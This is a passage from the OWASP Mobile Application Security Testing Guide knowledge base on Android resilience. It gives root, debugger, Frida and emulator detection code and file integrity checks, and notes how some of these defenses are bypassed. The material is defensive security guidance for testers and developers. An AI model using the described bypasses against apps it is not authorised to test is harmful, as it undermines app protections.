<pre><code>/sbin/su\n/system/bin/su\n/system/bin/failsafe/su\n/system/xbin/su\n/system/xbin/busybox\n/system/sd/xbin/su\n/data/local/su\n/data/local/xbin/su\n/data/local/bin/su\n</code></pre> <p>Checking whether <code>su</code> is on the PATH also works:</p> <pre><code>    public static boolean checkRoot(){\n        for(String pathDir : System.getenv(\"PATH\").split(\":\")){\n            if(new File(pathDir, \"su\").exists()) {\n                return true;\n            }\n        }\n        return false;\n    }\n</code></pre> <p>File checks can be easily implemented in both Java and native code. The following JNI example (adapted from rootinspector) uses the <code>stat</code> system call to retrieve information about a file and returns \"1\" if the file exists.</p> <pre><code>jboolean Java_com_example_statfile(JNIEnv * env, jobject this, jstring filepath) {\n  jboolean fileExists = 0;\n  jboolean isCopy;\n  const char * path = (*env)-&gt;GetStringUTFChars(env, filepath, &amp;isCopy);\n  struct stat fileattrib;\n  if (stat(path, &amp;fileattrib) &lt; 0) {\n    __android_log_print(ANDROID_LOG_DEBUG, DEBUG_TAG, \"NATIVE: stat error: [%s]\", strerror(errno));\n  } else\n  {\n    __android_log_print(ANDROID_LOG_DEBUG, DEBUG_TAG, \"NATIVE: stat success, access perms: [%d]\", fileattrib.st_mode);\n    return 1;\n  }\n\n  return 0;\n}\n</code></pre>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0027/#executing-privileged-commands","title":"Executing Privileged Commands","text":"<p>Another way of determining whether <code>su</code> exists is attempting to execute it through the <code>Runtime.getRuntime.exec</code> method. An IOException will be thrown if <code>su</code> is not on the PATH. The same method can be used to check for other programs often found on rooted devices, such as busybox and the symbolic links that typically point to it.</p>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0027/#checking-running-processes","title":"Checking Running Processes","text":"<p>Supersu-by far the most popular rooting tool-runs an authentication daemon named <code>daemonsu</code>, so the presence of this process is another sign of a rooted device. Running processes can be enumerated with the <code>ActivityManager.getRunningAppProcesses</code> and <code>manager.getRunningServices</code> APIs, the <code>ps</code> command, and browsing through the <code>/proc</code> directory. The following is an example implemented in rootinspector:</p> <pre><code>    public boolean checkRunningProcesses() {\n\n      boolean returnValue = false;\n\n      // Get currently running application processes\n      List&lt;RunningServiceInfo&gt; list = manager.getRunningServices(300);\n\n      if(list != null){\n        String tempName;\n        for(int i=0;i&lt;list.size();++i){\n          tempName = list.get(i).process;\n\n          if(tempName.contains(\"supersu\") || tempName.contains(\"superuser\")){\n            returnValue = true;\n          }\n        }\n      }\n      return returnValue;\n    }\n</code></pre>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0027/#checking-installed-app-packages","title":"Checking Installed App Packages","text":"<p>You can use the Android package manager to obtain a list of installed packages. The following package names belong to popular rooting tools:</p> <pre><code>eu.chainfire.supersu\ncom.noshufou.android.su\ncom.koushikdutta.superuser\ncom.zachspong.temprootremovejb\ncom.ramdroid.appquarantine\ncom.topjohnwu.magisk\n</code></pre>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0027/#checking-for-writable-partitions-and-system-directories","title":"Checking for Writable Partitions and System Directories","text":"<p>Unusual permissions on system directories may indicate a customized or rooted device. Although the system and data directories are normally mounted read-only, you'll sometimes find them mounted read-write when the device is rooted. Look for these filesystems mounted with the \"rw\" flag or try to create a file in the data directories.</p>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0027/#checking-for-custom-android-builds","title":"Checking for Custom Android Builds","text":"<p>Checking for signs of test builds and custom ROMs is also helpful. One way to do this is to check the BUILD tag for test-keys, which normally indicate a custom Android image. Check the BUILD tag as follows:</p> <pre><code>private boolean isTestKeyBuild()\n{\nString str = Build.TAGS;\nif ((str != null) &amp;&amp; (str.contains(\"test-keys\")));\nfor (int i = 1; ; i = 0)\n  return i;\n}\n</code></pre> <p>Missing Google Over-The-Air (OTA) certificates is another sign of a custom ROM: on stock Android builds, OTA updates Google's public certificates.</p>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0028/","title":"MASTG-KNOW-0028: Anti-Debugging","text":"<p>Debugging is a highly effective way to analyze runtime app behavior. It allows the reverse engineer to step through the code, stop app execution at arbitrary points, inspect the state of variables, read and modify memory, and a lot more.</p> <p>Anti-debugging features can be preventive or reactive. As the name implies, preventive anti-debugging prevents the debugger from attaching in the first place; reactive anti-debugging involves detecting debuggers and reacting to them in some way (e.g., terminating the app or triggering hidden behavior). The \"more-is-better\" rule applies: to maximize effectiveness, defenders combine multiple methods of prevention and detection that operate on different API layers and are well distributed throughout the app.</p> <p>As mentioned in the \"Reverse Engineering and Tampering\" chapter, we have to deal with two debugging protocols on Android: we can debug on the Java level with JDWP or on the native layer via a ptrace-based debugger. A good anti-debugging scheme should defend against both types of debugging.</p>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0028/#jdwp-anti-debugging","title":"JDWP Anti-Debugging","text":"<p>In the chapter \"Reverse Engineering and Tampering\", we talked about JDWP, the protocol used for communication between the debugger and the Java Virtual Machine. We showed that it is easy to enable debugging for any app by patching its manifest file, and changing the <code>ro.debuggable</code> system property which enables debugging for all apps. Let's look at a few things developers do to detect and disable JDWP debuggers.</p>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0028/#checking-the-debuggable-flag-in-applicationinfo","title":"Checking the Debuggable Flag in ApplicationInfo","text":"<p>We have already encountered the <code>android:debuggable</code> attribute. This flag in the Android Manifest determines whether the JDWP thread is started for the app. Its value can be determined programmatically, via the app's <code>ApplicationInfo</code> object. If the flag is set, the manifest has been tampered with and allows debugging.</p> <pre><code>    public static boolean isDebuggable(Context context){\n\n        return ((context.getApplicationContext().getApplicationInfo().flags &amp; ApplicationInfo.FLAG_DEBUGGABLE) != 0);\n\n    }\n</code></pre>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0028/#isdebuggerconnected","title":"isDebuggerConnected","text":"<p>While this might be pretty obvious to circumvent for a reverse engineer, you can use <code>isDebuggerConnected</code> from the <code>android.os.Debug</code> class to determine whether a debugger is connected.</p> <pre><code>    public static boolean detectDebugger() {\n        return Debug.isDebuggerConnected();\n    }\n</code></pre> <p>The same API can be called via native code by accessing the DvmGlobals global structure.</p> <pre><code>JNIEXPORT jboolean JNICALL Java_com_test_debugging_DebuggerConnectedJNI(JNIenv * env, jobject obj) {\n    if (gDvm.debuggerConnected || gDvm.debuggerActive)\n        return JNI_TRUE;\n    return JNI_FALSE;\n}\n</code></pre>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0028/#timer-checks","title":"Timer Checks","text":"<p><code>Debug.threadCpuTimeNanos</code> indicates the amount of time that the current thread has been executing code. Because debugging slows down process execution, you can use the difference in execution time to guess whether a debugger is attached.</p> <pre><code>static boolean detect_threadCpuTimeNanos(){\n  long start = Debug.threadCpuTimeNanos();\n\n  for(int i=0; i&lt;1000000; ++i)\n    continue;\n\n  long stop = Debug.threadCpuTimeNanos();\n\n  if(stop - start &lt; 10000000) {\n    return false;\n  }\n  else {\n    return true;\n  }\n}\n</code></pre>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0028/#messing-with-jdwp-related-data-structures","title":"Messing with JDWP-Related Data Structures","text":"<p>In Dalvik, the global virtual machine state is accessible via the <code>DvmGlobals</code> structure. The global variable gDvm holds a pointer to this structure. <code>DvmGlobals</code> contains various variables and pointers that are important for JDWP debugging and can be tampered with.</p> <pre><code>struct DvmGlobals {\n    /*\n     * Some options that could be worth tampering with :)\n     */\n\n    bool        jdwpAllowed;        // debugging allowed for this process?\n    bool        jdwpConfigured;     // has debugging info been provided?\n    JdwpTransportType jdwpTransport;\n    bool        jdwpServer;\n    char*       jdwpHost;\n    int         jdwpPort;\n    bool        jdwpSuspend;\n\n    Thread*     threadList;\n\n    bool        nativeDebuggerActive;\n    bool        debuggerConnected;      /* debugger or DDMS is connected */\n    bool        debuggerActive;         /* debugger is making requests */\n    JdwpState*  jdwpState;\n\n};\n</code></pre> <p>For example, setting the gDvm.methDalvikDdmcServer_dispatch function pointer to NULL crashes the JDWP thread:</p> <pre><code>JNIEXPORT jboolean JNICALL Java_poc_c_crashOnInit ( JNIEnv* env , jobject ) {\n  gDvm.methDalvikDdmcServer_dispatch = NULL;\n}\n</code></pre> <p>You can disable debugging by using similar techniques in ART even though the gDvm variable is not available. The ART runtime exports some of the vtables of JDWP-related classes as global symbols (in C++, vtables are tables that hold pointers to class methods). This includes the vtables of the classes <code>JdwpSocketState</code> and <code>JdwpAdbState</code>, which handle JDWP connections via network sockets and ADB, respectively. You can manipulate the behavior of the debugging runtime by overwriting the method pointers in the associated vtables (archived).</p> <p>One way to overwrite the method pointers is to overwrite the address of the function <code>jdwpAdbState::ProcessIncoming</code> with the address of <code>JdwpAdbState::Shutdown</code>. This will cause the debugger to disconnect immediately.</p> <pre><code>#include &lt;jni.h&gt;\n#include &lt;string&gt;\n#include &lt;android/log.h&gt;\n#include &lt;dlfcn.h&gt;\n#include &lt;sys/mman.h&gt;\n#include &lt;jdwp/jdwp.h&gt;\n\n#define log(FMT, ...) __android_log_print(ANDROID_LOG_VERBOSE, \"JDWPFun\", FMT, ##__VA_ARGS__)\n\n// Vtable structure. Just to make messing around with it more intuitive\n\nstruct VT_JdwpAdbState {\n    unsigned long x;\n    unsigned long y;\n    void * JdwpSocketState_destructor;\n    void * _JdwpSocketState_destructor;\n    void * Accept;\n    void * showmanyc;\n    void * ShutDown;\n    void * ProcessIncoming;\n};\n\nextern \"C\"\n\nJNIEXPORT void JNICALL Java_sg_vantagepoint_jdwptest_MainActivity_JDWPfun(\n        JNIEnv *env,\n        jobject /* this */) {\n\n    void* lib = dlopen(\"libart.so\", RTLD_NOW);\n\n    if (lib == NULL) {\n        log(\"Error loading libart.so\");\n        dlerror();\n    }else{\n\n        struct VT_JdwpAdbState *vtable = ( struct VT_JdwpAdbState *)dlsym(lib, \"_ZTVN3art4JDWP12JdwpAdbStateE\");\n\n        if (vtable == 0) {\n            log(\"Couldn't resolve symbol '_ZTVN3art4JDWP12JdwpAdbStateE'.\\n\");\n        }else {\n\n            log(\"Vtable for JdwpAdbState at: %08x\\n\", vtable);\n\n            // Let the fun begin!\n\n            unsigned long pagesize = sysconf(_SC_PAGE_SIZE);\n            unsigned long page = (unsigned long)vtable &amp; ~(pagesize-1);\n\n            mprotect((void *)page, pagesize, PROT_READ | PROT_WRITE);\n\n            vtable-&gt;ProcessIncoming = vtable-&gt;ShutDown;\n\n            // Reset permissions &amp; flush cache\n\n            mprotect((void *)page, pagesize, PROT_READ);\n\n        }\n    }\n}\n</code></pre>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0028/#traditional-anti-debugging","title":"Traditional Anti-Debugging","text":"<p>On Linux, the <code>ptrace</code> system call is used to observe and control the execution of a process (the tracee) and to examine and change that process' memory and registers. <code>ptrace</code> is the primary way to implement system call tracing and breakpoint debugging in native code. Most JDWP anti-debugging tricks (which may be safe for timer-based checks) won't catch classical debuggers based on <code>ptrace</code> and therefore, many Android anti-debugging tricks include <code>ptrace</code>, often exploiting the fact that only one debugger at a time can attach to a process.</p>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0028/#checking-tracerpid","title":"Checking TracerPid","text":"<p>When you debug an app and set a breakpoint on native code, Android Studio will copy the needed files to the target device and start the lldb-server which will use <code>ptrace</code> to attach to the process. From this moment on, if you inspect the status file of the debugged process (<code>/proc/&lt;pid&gt;/status</code> or <code>/proc/self/status</code>), you will see that the \"TracerPid\" field has a value different from 0, which is a sign of debugging.</p> <p>Remember that this only applies to native code. If you're debugging a Java/Kotlin-only app the value of the \"TracerPid\" field should be 0.</p> <p>This technique is usually applied within the JNI native libraries in C, as shown in Google's gperftools (Google Performance Tools)) Heap Checker implementation of the <code>IsDebuggerAttached</code> method. However, if you prefer to include this check as part of your Java/Kotlin code you can refer to this Java implementation of the <code>hasTracerPid</code> method from Tim Strazzere's Anti-Emulator project.</p> <p>When trying to implement such a method yourself, you can manually check the value of TracerPid with ADB. The following listing uses Google's NDK sample app hello-jni (com.example.hellojni) to perform the check after attaching Android Studio's debugger:</p> <pre><code>$ adb shell ps -A | grep com.example.hellojni\nu0_a271      11657   573 4302108  50600 ptrace_stop         0 t com.example.hellojni\n$ adb shell cat /proc/11657/status | grep -e \"^TracerPid:\" | sed \"s/^TracerPid:\\t//\"\nTracerPid:      11839\n$ adb shell ps -A | grep 11839\nu0_a271      11839 11837   14024   4548 poll_schedule_timeout 0 S lldb-server\n</code></pre> <p>You can see how the status file of com.example.hellojni (PID=11657) contains a TracerPID of 11839, which we can identify as the lldb-server process.</p>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0028/#using-fork-and-ptrace","title":"Using Fork and ptrace","text":"<p>You can prevent debugging of a process by forking a child process and attaching it to the parent as a debugger via code similar to the following simple example code:</p> <pre><code>void fork_and_attach()\n{\n  int pid = fork();\n\n  if (pid == 0)\n    {\n      int ppid = getppid();\n\n      if (ptrace(PTRACE_ATTACH, ppid, NULL, NULL) == 0)\n        {\n          waitpid(ppid, NULL, 0);\n\n          /* Continue the parent process */\n          ptrace(PTRACE_CONT, NULL, NULL);\n        }\n    }\n}\n</code></pre> <p>With the child attached, further attempts to attach to the parent will fail. We can verify this by compiling the code into a JNI function and packing it into an app we run on the device.</p> <pre><code>root@android:/ # ps | grep -i anti\nu0_a151   18190 201   1535844 54908 ffffffff b6e0f124 S sg.vantagepoint.antidebug\nu0_a151   18224 18190 1495180 35824 c019a3ac b6e0ee5c S sg.vantagepoint.antidebug\n</code></pre> <p>Attempting to attach to the parent process with gdbserver fails with an error:</p> <pre><code>root@android:/ # ./gdbserver --attach localhost:12345 18190\nwarning: process 18190 is already traced by process 18224\nCannot attach to lwp 18190: Operation not permitted (1)\nExiting\n</code></pre> <p>You can easily bypass this failure, however, by killing the child and \"freeing\" the parent from being traced. You'll therefore usually find more elaborate schemes, involving multiple processes and threads as well as some form of monitoring to impede tampering. Common methods include</p> <ul> <li>forking multiple processes that trace one another,</li> <li>keeping track of running processes to make sure the children stay alive,</li> <li>monitoring values in the <code>/proc</code> filesystem, such as TracerPID in <code>/proc/pid/status</code>.</li> </ul> <p>Let's look at a simple improvement for the method above. After the initial <code>fork</code>, we launch in the parent an extra thread that continually monitors the child's status. Depending on whether the app has been built in debug or release mode (which is indicated by the <code>android:debuggable</code> flag in the manifest), the child process should do one of the following things:</p> <ul> <li>In release mode: The call to ptrace fails and the child crashes immediately with a segmentation fault (exit code 11).</li> <li>In debug mode: The call to ptrace works and the child should run indefinitely. Consequently, a call to <code>waitpid(child_pid)</code> should never return. If it does, something is fishy and we would kill the whole process group.</li> </ul> <p>The following is the complete code for implementing this improvement with a JNI function:</p> <pre><code>#include &lt;jni.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/ptrace.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;pthread.h&gt;\n\nstatic int child_pid;\n\nvoid *monitor_pid() {\n\n    int status;\n\n    waitpid(child_pid, &amp;status, 0);\n\n    /* Child status should never change. */\n\n    _exit(0); // Commit seppuku\n\n}\n\nvoid anti_debug() {\n\n    child_pid = fork();\n\n    if (child_pid == 0)\n    {\n        int ppid = getppid();\n        int status;\n\n        if (ptrace(PTRACE_ATTACH, ppid, NULL, NULL) == 0)\n        {\n            waitpid(ppid, &amp;status, 0);\n\n            ptrace(PTRACE_CONT, ppid, NULL, NULL);\n\n            while (waitpid(ppid, &amp;status, 0)) {\n\n                if (WIFSTOPPED(status)) {\n                    ptrace(PTRACE_CONT, ppid, NULL, NULL);\n                } else {\n                    // Process has exited\n                    _exit(0);\n                }\n            }\n        }\n\n    } else {\n        pthread_t t;\n\n        /* Start the monitoring thread */\n        pthread_create(&amp;t, NULL, monitor_pid, (void *)NULL);\n    }\n}\n\nJNIEXPORT void JNICALL\nJava_sg_vantagepoint_antidebug_MainActivity_antidebug(JNIEnv *env, jobject instance) {\n\n    anti_debug();\n}\n</code></pre> <p>Again, we pack this into an Android app to see if it works. Just as before, two processes show up when we run the app's debug build.</p> <pre><code>root@android:/ # ps | grep -I anti-debug\nu0_a152   20267 201   1552508 56796 ffffffff b6e0f124 S sg.vantagepoint.anti-debug\nu0_a152   20301 20267 1495192 33980 c019a3ac b6e0ee5c S sg.vantagepoint.anti-debug\n</code></pre> <p>However, if we terminate the child process at this point, the parent exits as well:</p> <pre><code>root@android:/ # kill -9 20301\n130|root@hammerhead:/ # cd /data/local/tmp\nroot@android:/ # ./gdbserver --attach localhost:12345 20267\ngdbserver: unable to open /proc file '/proc/20267/status'\nCannot attach to lwp 20267: No such file or directory (2)\nExiting\n</code></pre> <p>To bypass this, we must modify the app's behavior slightly (the easiest ways to do so are patching the call to <code>_exit</code> with NOPs and hooking the function <code>_exit</code> in <code>libc.so</code>). At this point, we have entered the proverbial \"arms race\": implementing more intricate forms of this defense as well as bypassing it are always possible.</p>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0029/","title":"MASTG-KNOW-0029: File Integrity Checks","text":"<p>There are two topics related to file integrity:</p> <ol> <li>Code integrity checks: You can use CRC checks as an additional protection layer for the app bytecode, native libraries, and important data files. This way the app would only run correctly in its unmodified state, even if the code signature is valid.</li> <li>File storage integrity checks: The integrity of files that the application stores on the SD card or public storage and the integrity of key-value pairs that are stored in <code>SharedPreferences</code> should be protected.</li> </ol>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0029/#sample-implementation-application-source-code","title":"Sample Implementation - Application Source Code","text":"<p>Integrity checks often calculate a checksum or hash over selected files. Commonly protected files include</p> <ul> <li>AndroidManifest.xml,</li> <li>class files *.dex,</li> <li>native libraries (*.so).</li> </ul> <p>The following sample implementation from the Android Cracking blog calculates a CRC over <code>classes.dex</code> and compares it to the expected value.</p> <pre><code>private void crcTest() throws IOException {\n boolean modified = false;\n // required dex crc value stored as a text string.\n // it could be any invisible layout element\n long dexCrc = Long.parseLong(Main.MyContext.getString(R.string.dex_crc));\n\n ZipFile zf = new ZipFile(Main.MyContext.getPackageCodePath());\n ZipEntry ze = zf.getEntry(\"classes.dex\");\n\n if ( ze.getCrc() != dexCrc ) {\n  // dex has been modified\n  modified = true;\n }\n else {\n  // dex not tampered with\n  modified = false;\n }\n}\n</code></pre>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0029/#sample-implementation-storage","title":"Sample Implementation - Storage","text":"<p>When providing integrity on the storage itself, you can either create an HMAC over a given key-value pair (as for the Android <code>SharedPreferences</code>) or create an HMAC over a complete file that's provided by the file system.</p> <p>When using an HMAC, you can use a bouncy castle implementation or the AndroidKeyStore to HMAC the given content.</p> <p>Complete the following procedure when generating an HMAC with BouncyCastle:</p> <ol> <li>Make sure BouncyCastle or SpongyCastle is registered as a security provider.</li> <li>Initialize the HMAC with a key (which can be stored in a keystore).</li> <li>Get the byte array of the content that needs an HMAC.</li> <li>Call <code>doFinal</code> on the HMAC with the bytecode.</li> <li>Append the HMAC to the bytearray obtained in step 3.</li> <li>Store the result of step 5.</li> </ol> <p>Complete the following procedure when verifying the HMAC with BouncyCastle:</p> <ol> <li>Make sure that BouncyCastle or SpongyCastle is registered as a security provider.</li> <li>Extract the message and the HMAC-bytes as separate arrays.</li> <li>Repeat steps 1-4 of the procedure for generating an HMAC.</li> <li>Compare the extracted HMAC-bytes to the result of step 3.</li> </ol> <p>When generating the HMAC based on the Android Keystore, then it is best to only do this for Android 6.0 (API level 23) and higher.</p> <p>The following is a convenient HMAC implementation without <code>AndroidKeyStore</code>:</p> <pre><code>public enum HMACWrapper {\n    HMAC_512(\"HMac-SHA512\"), //please note that this is the spec for the BC provider\n    HMAC_256(\"HMac-SHA256\");\n\n    private final String algorithm;\n\n    private HMACWrapper(final String algorithm) {\n        this.algorithm = algorithm;\n    }\n\n    public Mac createHMAC(final SecretKey key) {\n        try {\n            Mac e = Mac.getInstance(this.algorithm, \"BC\");\n            SecretKeySpec secret = new SecretKeySpec(key.getKey().getEncoded(), this.algorithm);\n            e.init(secret);\n            return e;\n        } catch (NoSuchProviderException | InvalidKeyException | NoSuchAlgorithmException e) {\n            //handle them\n        }\n    }\n\n    public byte[] hmac(byte[] message, SecretKey key) {\n        Mac mac = this.createHMAC(key);\n        return mac.doFinal(message);\n    }\n\n    public boolean verify(byte[] messageWithHMAC, SecretKey key) {\n        Mac mac = this.createHMAC(key);\n        byte[] checksum = extractChecksum(messageWithHMAC, mac.getMacLength());\n        byte[] message = extractMessage(messageWithHMAC, mac.getMacLength());\n        byte[] calculatedChecksum = this.hmac(message, key);\n        int diff = checksum.length ^ calculatedChecksum.length;\n\n        for (int i = 0; i &lt; checksum.length &amp;&amp; i &lt; calculatedChecksum.length; ++i) {\n            diff |= checksum[i] ^ calculatedChecksum[i];\n        }\n\n        return diff == 0;\n    }\n\n    public byte[] extractMessage(byte[] messageWithHMAC) {\n        Mac hmac = this.createHMAC(SecretKey.newKey());\n        return extractMessage(messageWithHMAC, hmac.getMacLength());\n    }\n\n    private static byte[] extractMessage(byte[] body, int checksumLength) {\n        if (body.length &gt;= checksumLength) {\n            byte[] message = new byte[body.length - checksumLength];\n            System.arraycopy(body, 0, message, 0, message.length);\n            return message;\n        } else {\n            return new byte[0];\n        }\n    }\n\n    private static byte[] extractChecksum(byte[] body, int checksumLength) {\n        if (body.length &gt;= checksumLength) {\n            byte[] checksum = new byte[checksumLength];\n            System.arraycopy(body, body.length - checksumLength, checksum, 0, checksumLength);\n            return checksum;\n        } else {\n            return new byte[0];\n        }\n    }\n\n    static {\n        Security.addProvider(new BouncyCastleProvider());\n    }\n}\n</code></pre> <p>Another way to provide integrity is to sign the byte array you obtained and add the signature to the original byte array.</p>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0030/","title":"MASTG-KNOW-0030: Detection of Reverse Engineering Tools","text":"<p>The presence of tools, frameworks and apps commonly used by reverse engineers may indicate an attempt to reverse engineer the app. Some of these tools can only run on a rooted device, while others force the app into debugging mode or depend on starting a background service on the mobile phone. Therefore, there are different ways that an app may implement to detect a reverse engineering attack and react to it, e.g. by terminating itself.</p> <p>You can detect popular reverse engineering tools that have been installed in an unmodified form by looking for associated application packages, files, processes, or other tool-specific modifications and artifacts. In the following examples, we'll discuss different ways to detect the Frida instrumentation framework, which is used extensively in this guide. Other tools, such as ElleKit and Xposed, can be detected similarly. Note that DBI/injection/hooking tools can often be detected implicitly, through runtime integrity checks, which are discussed below.</p> <p>For instance, in its default configuration on a rooted device, Frida runs on the device as frida-server. When you explicitly attach to a target app (e.g. via frida-trace or the Frida REPL), Frida injects a frida-agent into the memory of the app. Therefore, you may expect to find it there after attaching to the app (and not before). If you check <code>/proc/&lt;pid&gt;/maps</code> you'll find the frida-agent as frida-agent-64.so:</p> <pre><code>bullhead:/ # cat /proc/18370/maps | grep -i frida\n71b6bd6000-71b7d62000 r-xp  /data/local/tmp/re.frida.server/frida-agent-64.so\n71b7d7f000-71b7e06000 r--p  /data/local/tmp/re.frida.server/frida-agent-64.so\n71b7e06000-71b7e28000 rw-p  /data/local/tmp/re.frida.server/frida-agent-64.so\n</code></pre> <p>The other method (which also works for non-rooted devices) consists of embedding a frida-gadget into the APK and forcing the app to load it as one of its native libraries. If you inspect the app memory maps after starting the app (no need to attach explicitly to it) you'll find the embedded frida-gadget as libfrida-gadget.so.</p> <pre><code>bullhead:/ # cat /proc/18370/maps | grep -i frida\n\n71b865a000-71b97f1000 r-xp  /data/app/sg.vp.owasp_mobile.omtg_android-.../lib/arm64/libfrida-gadget.so\n71b9802000-71b988a000 r--p  /data/app/sg.vp.owasp_mobile.omtg_android-.../lib/arm64/libfrida-gadget.so\n71b988a000-71b98ac000 rw-p  /data/app/sg.vp.owasp_mobile.omtg_android-.../lib/arm64/libfrida-gadget.so\n</code></pre> <p>Looking at these two traces that Frida lefts behind, you might already imagine that detecting those would be a trivial task. And actually, so trivial will be bypassing that detection. But things can get much more complicated. The following table shortly presents a set of some typical Frida detection methods and a short discussion on their effectiveness.</p> <p>Some of the following detection methods are presented in the article \"The Jiu-Jitsu of Detecting Frida\" by Berdhard Mueller (archived). Please refer to it for more details and for example code snippets.</p> Method Description Discussion Checking the App Signature In order to embed the frida-gadget within the APK, it would need to be repackaged and resigned. You could check the signature of the APK when the app is starting (e.g. GET_SIGNING_CERTIFICATES since API level 28) and compare it to the one you pinned in your APK. This is unfortunately too trivial to bypass, e.g. by patching the APK or performing system call hooking. Check The Environment For Related Artifacts Artifacts can be package files, binaries, libraries, processes, and temporary files. For Frida, this could be the frida-server running in the target (rooted) system (the daemon responsible for exposing Frida over TCP). Inspect the running services (<code>getRunningServices</code>) and processes (<code>ps</code>) searching for one whose name is \"frida-server\". You could also walk through the list of loaded libraries and check for suspicious ones (e.g. those including \"frida\" in their names). Since Android 7.0 (API level 24), inspecting the running services/processes won't show you daemons like the frida-server as it is not being started by the app itself. Even if it would be possible, bypassing this would be as easy just renaming the corresponding Frida artifact (frida-server/frida-gadget/frida-agent). Checking For Open TCP Ports The frida-server process binds to TCP port 27042 by default. Check whether this port is open is another method of detecting the daemon. This method detects frida-server in its default mode, but the listening port can be changed via a command line argument, so bypassing this is a little too trivial. Checking For Ports Responding To D-Bus Auth <code>frida-server</code> uses the D-Bus protocol to communicate, so you can expect it to respond to D-Bus AUTH. Send a D-Bus AUTH message to every open port and check for an answer, hoping that <code>frida-server</code> will reveal itself. This is a fairly robust method of detecting <code>frida-server</code>, but Frida offers alternative modes of operation that don't require frida-server. Scanning Process Memory for Known Artifacts Scan the memory for artifacts found in Frida's libraries, e.g. the string \"LIBFRIDA\" present in all versions of frida-gadget and frida-agent. For example, use <code>Runtime.getRuntime().exec</code> and iterate through the memory mappings listed in <code>/proc/self/maps</code> or <code>/proc/&lt;pid&gt;/maps</code> (depending on the Android version) searching for the string. This method is a bit more effective, and it is difficult to bypass with Frida only, especially if some obfuscation has been added and if multiple artifacts are being scanned. However, the chosen artifacts might be patched in the Frida binaries. Find the source code on Berdhard Mueller's GitHub. <p>Please remember that this table is far from exhaustive. We could start talking about detecting named pipes (used by frida-server for external communication) and trampolines (indirect jump vectors inserted at the prologue of functions), which would help with detecting ElleKit or Frida's Interceptor. Many more techniques exist, and each of them will depend on whether you're using a rooted device, the specific version of the rooting method and/or the version of the tool itself. Further, the app can try to make it harder to detect the implemented protection mechanisms by using various obfuscation techniques. At the end, this is part of the cat and mouse game of protecting data being processed on an untrusted environment (an app running in the user device).</p> <p>It is important to note that these controls are only increasing the complexity of the reverse engineering process. If used, the best approach is to combine the controls cleverly instead of using them individually. However, none of them can assure a 100% effectiveness, as the reverse engineer will always have full access to the device and will therefore always win! You also have to consider that integrating some of the controls into your app might increase the complexity of your app and even have an impact on its performance.</p>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0031/","title":"MASTG-KNOW-0031: Emulator Detection","text":"<p>In the context of anti-reversing, the goal of emulator detection is to increase the difficulty of running the app on an emulated device, which impedes some tools and techniques reverse engineers like to use. This increased difficulty forces the reverse engineer to defeat the emulator checks or utilize the physical device, thereby barring the access required for large-scale device analysis.</p> <p>There are several indicators that the device in question is being emulated. Although all these API calls can be hooked, these indicators provide a modest first line of defense.</p> <p>The first set of indicators are in the file <code>build.prop</code>.</p> <pre><code>API Method          Value           Meaning\nBuild.ABI           armeabi         possibly emulator\nBUILD.ABI2          unknown         possibly emulator\nBuild.BOARD         unknown         emulator\nBuild.Brand         generic         emulator\nBuild.DEVICE        generic         emulator\nBuild.FINGERPRINT   generic         emulator\nBuild.Hardware      goldfish        emulator\nBuild.Host          android-test    possibly emulator\nBuild.ID            FRF91           emulator\nBuild.MANUFACTURER  unknown         emulator\nBuild.MODEL         sdk             emulator\nBuild.PRODUCT       sdk             emulator\nBuild.RADIO         unknown         possibly emulator\nBuild.SERIAL        null            emulator\nBuild.USER          android-build   emulator\n</code></pre> <p>You can edit the file <code>build.prop</code> on a rooted Android device or modify it while compiling AOSP from source. Both techniques will allow you to bypass the static string checks above.</p> <p>The next set of static indicators utilize the Telephony manager. All Android emulators have fixed values that this API can query.</p> <pre><code>API                                                     Value                   Meaning\nTelephonyManager.getDeviceId()                          0's                     emulator\nTelephonyManager.getLine1 Number()                      155552155               emulator\nTelephonyManager.getNetworkCountryIso()                 us                      possibly emulator\nTelephonyManager.getNetworkType()                       3                       possibly emulator\nTelephonyManager.getNetworkOperator().substring(0,3)    310                     possibly emulator\nTelephonyManager.getNetworkOperator().substring(3)      260                     possibly emulator\nTelephonyManager.getPhoneType()                         1                       possibly 